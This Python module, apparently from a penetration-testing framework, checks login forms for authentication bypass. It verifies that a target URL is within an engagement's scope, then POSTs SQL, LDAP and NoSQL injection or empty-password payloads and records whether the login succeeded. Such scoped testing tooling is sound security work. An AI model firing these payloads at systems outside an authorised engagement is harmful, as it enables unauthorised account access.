from __future__ import annotations

import json
from dataclasses import dataclass
from pathlib import Path
from typing import Sequence
from urllib.parse import urlparse

import httpx

from forge.db.session import get_engagement_db
from forge.governance.scope_gate import EngagementScope, ScopeGate
from forge.opsec.scope_gate import ScopeViolationError, assert_in_scope, load_scope_from_db


@dataclass(frozen=True)
class AuthBypassResult:
    engagement_id: int
    target_url: str
    technique: str
    success: bool
    response_code: int
    response_hint: str


_PAYLOADS: dict[str, dict[str, str]] = {
    "sql-injection": {"username": "' OR 1=1--", "password": "x"},
    "ldap-injection": {"username": "*)(&", "password": "x"},
    "logic-bypass": {"username": "admin", "password": ""},
    "nosql-injection": {"username": '{"$ne":null}', "password": '{"$ne":null}'},
}


def _scope_gate_from_values(
    *,
    scope_values: Sequence[str],
    url_prefixes: Sequence[str],
) -> ScopeGate | None:
    domains: list[str] = []
    ip_ranges: list[str] = []
    prefixes = [str(item) for item in url_prefixes if str(item or "").strip()]
    for item in scope_values:
        text = str(item or "").strip()
        if not text:
            continue
        if text.startswith(("http://", "https://")):
            prefixes.append(text)
            host = urlparse(text).hostname
            if host:
                domains.append(host)
        elif "/" in text:
            ip_ranges.append(text)
        else:
            domains.append(text)
    domains = list(dict.fromkeys(domains))
    ip_ranges = list(dict.fromkeys(ip_ranges))
    prefixes = list(dict.fromkeys(prefixes))
    if not domains and not ip_ranges and not prefixes:
        return None
    return ScopeGate(EngagementScope(domains=domains, ip_ranges=ip_ranges, urls=prefixes))


def _assert_target_in_scope(
    *,
    engagement_id: int,
    db_path: Path,
    target_url: str,
    scope_values: Sequence[str] | None = None,
    url_prefixes: Sequence[str] | None = None,
    require_scope: bool = False,
) -> None:
    scope = (
        [str(item) for item in scope_values if str(item or "").strip()]
        if scope_values is not None
        else load_scope_from_db(str(db_path), engagement_id)
    )
    prefixes = [str(item) for item in url_prefixes or [] if str(item or "").strip()]
    if require_scope and not scope and not prefixes:
        raise ScopeViolationError(target_url, [])
    gate = _scope_gate_from_values(scope_values=scope, url_prefixes=prefixes)
    if gate is not None:
        if not gate.is_in_scope(target_url):
            raise ScopeViolationError(target_url, list(scope) + prefixes)
        return
    assert_in_scope(target_url, scope)


def run_bypass_assessment(
    engagement_id: int,
    db_path: Path,
    target_url: str,
    technique: str = "sql-injection",
    timeout: float = 12.0,
    scope_values: Sequence[str] | None = None,
    url_prefixes: Sequence[str] | None = None,
    require_scope: bool = False,
) -> AuthBypassResult:
    _assert_target_in_scope(
        engagement_id=engagement_id,
        db_path=db_path,
        target_url=target_url,
        scope_values=scope_values,
        url_prefixes=url_prefixes,
        require_scope=require_scope,
    )
    payload = _PAYLOADS.get(technique) or _PAYLOADS["sql-injection"]
    try:
        resp = httpx.post(target_url, data=payload, timeout=timeout, follow_redirects=False)
        body = resp.text.lower()
        success_hint = any(token in body for token in ("dashboard", "logout", "welcome", "token"))
        success = resp.status_code in {200, 302} and success_hint
        result = AuthBypassResult(
            engagement_id=engagement_id,
            target_url=target_url,
            technique=technique,
            success=success,
            response_code=resp.status_code,
            response_hint=body[:200],
        )
    except Exception as exc:
        result = AuthBypassResult(
            engagement_id=engagement_id,
            target_url=target_url,
            technique=technique,
            success=False,
            response_code=0,
            response_hint=str(exc)[:200],
        )
    con = get_engagement_db(db_path)
    try:
        con.execute(
            """
            INSERT INTO auth_test_results (
                engagement_id, target_url, form_data, attack_type, success, response_data
            ) VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                engagement_id,
                target_url,
                json.dumps(payload),
                technique,
                1 if result.success else 0,
                json.dumps(
                    {
                        "response_code": result.response_code,
                        "response_hint": result.response_hint,
                    }
                ),
            ),
        )
        con.commit()
    finally:
        con.close()
    return result
